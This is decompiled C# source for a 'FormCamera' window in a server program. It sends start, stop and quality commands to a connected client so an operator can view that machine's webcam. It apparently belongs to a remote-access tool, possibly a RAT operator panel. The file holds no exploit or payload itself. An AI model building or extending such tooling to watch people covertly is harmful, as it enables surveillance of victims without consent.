using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms
{
	// Token: 0x02000093 RID: 147
	public partial class FormCamera : FormMaterial
	{
		// Token: 0x060003F4 RID: 1012 RVA: 0x00030B18 File Offset: 0x0002ED18
		public FormCamera()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x060003F5 RID: 1013 RVA: 0x00030B44 File Offset: 0x0002ED44
		private void materialSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.materialSwitch1.Checked)
			{
				this.client.Send(LEB128.Write(new object[]
				{
					"Stop"
				}));
				return;
			}
			if (this.rjComboBox1.SelectedIndex == -1)
			{
				this.materialSwitch1.Checked = false;
				return;
			}
			this.client.Send(LEB128.Write(new object[]
			{
				"Start",
				(byte)this.numericUpDown2.Value,
				(byte)this.rjComboBox1.SelectedIndex
			}));
		}

		// Token: 0x060003F6 RID: 1014 RVA: 0x00030BE2 File Offset: 0x0002EDE2
		private void Closing1(object sender, EventArgs e)
		{
			if (this.client != null)
			{
				this.client.Disconnect();
			}
		}

		// Token: 0x060003F7 RID: 1015 RVA: 0x00030BF7 File Offset: 0x0002EDF7
		private void numericUpDown2_ValueChanged(object sender, EventArgs e)
		{
			if (this.materialSwitch1.Checked)
			{
				this.client.Send(new object[]
				{
					"Quality",
					(byte)this.numericUpDown2.Value
				});
			}
		}

		// Token: 0x060003F8 RID: 1016 RVA: 0x00030C37 File Offset: 0x0002EE37
		private void FormCamera_Load(object sender, EventArgs e)
		{
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			this.timer1.Start();
		}

		// Token: 0x060003F9 RID: 1017 RVA: 0x00030C61 File Offset: 0x0002EE61
		private void ChangeScheme(object sender)
		{
			this.rjComboBox1.BorderColor = FormMaterial.PrimaryColor;
			this.numericUpDown2.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x060003FA RID: 1018 RVA: 0x00030C83 File Offset: 0x0002EE83
		private void timer1_Tick(object sender, EventArgs e)
		{
			if (!this.parrent.itsConnect)
			{
				base.Close();
			}
			if (this.client != null && !this.client.itsConnect)
			{
				base.Close();
			}
		}

		// Token: 0x04000242 RID: 578
		public int FPS;

		// Token: 0x04000243 RID: 579
		public Stopwatch sw = Stopwatch.StartNew();

		// Token: 0x04000244 RID: 580
		public Clients client;

		// Token: 0x04000245 RID: 581
		public Clients parrent;
	}
}
